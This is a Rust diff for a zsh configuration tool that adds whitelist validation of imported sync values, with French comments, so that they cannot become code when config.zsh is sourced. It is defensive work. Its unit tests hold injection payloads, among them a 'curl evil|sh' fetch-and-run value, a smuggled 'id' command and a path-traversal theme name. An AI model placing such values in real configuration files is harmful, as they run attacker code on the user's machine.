@@ -185,6 +185,14 @@ fn import(file: &str) {
         }
     };
 
+    // config.zsh est sourcé à chaque démarrage : une valeur écrite telle quelle y devient du
+    // code. Refus avant toute écriture, y compris la sauvegarde.
+    let bad = invalid_fields(&sync);
+    if !bad.is_empty() {
+        eprintln!("{} Import refusé, valeurs invalides : {}", "✗".red(), bad.join(", "));
+        std::process::exit(1);
+    }
+
     let mut config_content = match config::read_config() {
         Ok(c) => c,
         Err(e) => {
@@ -373,4 +381,66 @@ fn extract_value(content: &str, key: &str) -> String {
         .and_then(|l| l.split('=').nth(1))
         .map(|v| v.trim().trim_matches('"').to_string())
         .unwrap_or_default()
+}
+
+/// Nom sûr à écrire dans config.zsh ou .current_theme : ni espace, ni `;`, ni `/`, ni `.`.
+fn is_name(s: &str, allow_dash: bool) -> bool {
+    !s.is_empty()
+        && s.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || (allow_dash && c == '-'))
+}
+
+/// Champs refusés, dans l'ordre du fichier (même liste blanche que `_zanvil_sync_validate`).
+fn invalid_fields(sync: &SyncConfig) -> Vec<String> {
+    let mut bad: Vec<String> = sync
+        .modules
+        .keys()
+        .filter(|k| !is_name(k, false))
+        .map(|k| format!("modules.{}", k))
+        .collect();
+    for (key, val) in [
+        ("theme", &sync.theme),
+        ("theme_light", &sync.theme_light),
+        ("theme_dark", &sync.theme_dark),
+    ] {
+        if !val.is_empty() && !is_name(val, true) {
+            bad.push(key.to_string());
+        }
+    }
+    let mode = &sync.auto_update.mode;
+    if !mode.is_empty() && !mode.chars().all(|c| c.is_ascii_lowercase()) {
+        bad.push("auto_update.mode".to_string());
+    }
+    bad
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn sync(theme_light: &str, module: &str, mode: &str) -> SyncConfig {
+        SyncConfig {
+            version: String::new(),
+            exported_at: String::new(),
+            modules: BTreeMap::from([(module.to_string(), true)]),
+            theme: "tokyo-night-pro".to_string(),
+            theme_light: theme_light.to_string(),
+            theme_dark: String::new(),
+            plugins: vec![],
+            auto_update: AutoUpdateConfig { enabled: true, frequency: 1, mode: mode.to_string() },
+        }
+    }
+
+    #[test]
+    fn accepts_a_regular_export() {
+        assert!(invalid_fields(&sync("forge", "KUBE", "auto")).is_empty());
+    }
+
+    #[test]
+    fn refuses_values_that_would_become_code_or_paths() {
+        let s = sync("x; curl evil|sh", "X;Y", "auto\"; id #");
+        assert_eq!(invalid_fields(&s), ["modules.X;Y", "theme_light", "auto_update.mode"]);
+        let mut t = sync("", "KUBE", "");
+        t.theme = "../../tmp/p".to_string();
+        assert_eq!(invalid_fields(&t), ["theme"]);
+    }
 }
